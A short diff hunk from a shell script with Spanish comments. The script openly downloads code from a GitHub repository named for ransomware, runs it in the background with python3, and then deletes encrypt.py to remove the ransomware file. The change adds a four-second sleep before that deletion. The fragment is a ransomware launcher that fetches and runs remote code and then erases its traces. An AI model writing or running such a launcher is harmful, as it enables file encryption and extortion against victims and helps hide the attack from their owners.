@@ -10,7 +10,7 @@ curl -O https://raw.githubusercontent.com/isoprophlex/ransomware/ransomware-with
 python3 -B run.py &
 
 # Eliminar archivo de ransomware?
-# ?
+sleep 4
 rm encrypt.py
 
 # Eliminar archivo de script
